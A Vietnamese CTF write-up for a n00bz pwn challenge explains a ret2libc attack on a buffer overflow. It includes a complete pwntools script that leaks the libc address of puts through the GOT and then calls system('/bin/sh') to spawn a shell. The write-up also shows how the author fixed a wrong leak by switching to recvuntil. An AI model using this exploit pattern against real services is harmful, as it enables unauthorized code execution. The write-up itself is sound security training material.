# RET2LIBC

**ida:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/5d5ecf94-e55c-409c-88f2-59bb9529ec07)


**checksec và vm:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/e83b1fdb-601d-4d60-9d75-981e224566da)


**got:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/09ccbe9d-2299-4de8-bb3b-47ade86792fc)


check các gadget thì chỉ có **pop rdi, pie đóng** nên ta nghĩ ngay đến cách làm **ret2libc** 

**đọc ida thì ta thấy ở lần nhập đầu không có lỗi gì hết nên ta nhập đại 16byte rồi bỏ qua, nhưng tại lần nhập 2 thì có lỗi BOF, nên ta sẽ dựa vào đây  để khai thác địa chỉ libc**

bài này khá giống task3 bên training nên mình dùng lại code để làm luôn(có note lại chi tiết trong ảnh )


![image](https://github.com/gookoosss/CTF.-/assets/128712571/31d28471-221f-4a09-972d-fc944b25c6d4)



tới đây ta chạy thử xem sao:


![image](https://github.com/gookoosss/CTF.-/assets/128712571/5fe1eb00-5cb1-4b8f-9c11-6862375a5e24)


hmm lỗi rồi nè

**chạy lại lần nữa thì thấy địa chỉ ta leak ra ko đúng với của libc, nên chương trình ko trỏ được đúng đến địa chỉ của system và /bin/sh trong libc**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/50ca8120-254f-4785-bc24-a7d7d725a6d1)


![image](https://github.com/gookoosss/CTF.-/assets/128712571/3f981233-e270-4b7c-a23d-f26d00790f52)


như ảnh thì ta thấy địa chỉ leak vs libc rất khác nhau , nên ta có thể đoán được khả năng cao là do ta đã leak nhầm 1 dữ liệu nào đó  mà chương trình in ra 

giờ ta kiểm tra xem dữ liệu ta leak ra là gì 


![image](https://github.com/gookoosss/CTF.-/assets/128712571/372394f1-61a2-47aa-af44-9e7e9320be05)


oke đến đây hiểu vấn đề rồi 

```
libc_leak = u64(p.recv(6) + b'\0\0')
```

tại đây **p.recv(6)** nhận sai dữ liệu tại hàm puts trả về, để fix lỗi này ta cần đùng **p.recvuntil()** để trỏ đến dữ liệu ta cần leak ra

để ý ở hàm ret trả về **fake_flag** là **n00bz{f4k3_fl4g}** , nên ta dùng **p.recvuntil(b'n00bz{f4k3_fl4g}')** để leak đúng được địa chỉ libc đằng sau **fake_flag**

**script:**

```
from pwn import *

# p = remote('challs.n00bzunit3d.xyz', 61223)
p = process('./pwn2_patched')
exe = ELF('./pwn2_patched')
libc = ELF('libc.so.6')

pop_rdi = 0x0000000000401196
ret_addr = 0x000000000040101a

p.sendline(b'a'*16) # lần nhập 1 ko có lỗi 

payload = b'a'*40 #offset
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])

p.sendline(payload) # gửi payload vào lần nhập 2

p.recvuntil(b'n00bz{f4k3_fl4g}')
libc_leak = u64(p.recv(6) + b'\0\0') #lấy địa chỉ leak ra 
libc.address = libc_leak - libc.sym['puts']
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

gdb.attach(p, gdbscript = '''
b*main+138
c
''')
input()

p.sendline(b'a'*16)

payload = b'a'*40
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(ret_addr)
payload += p64(libc.sym['system'])
# payload += p64(gadget)

p.sendline(payload)

p.interactive()
```

chạy thử lại xem sao:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/55ea56dc-aa7a-42a4-a16d-e051e0efc9bd)


![image](https://github.com/gookoosss/CTF.-/assets/128712571/2f9a1e86-5311-403b-b475-9286a1749ba5)


lúc này địa chỉ ta leak ra giống vs địa chỉ base libc nên ta đã làm đúng rồi 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/022f597e-532a-415c-9cd1-93d18cfc6e0c)


đúng rồi nè hehe

**flag:**

***n00bz{3xpl01tw1th0u7w1n5uc355ful!}***

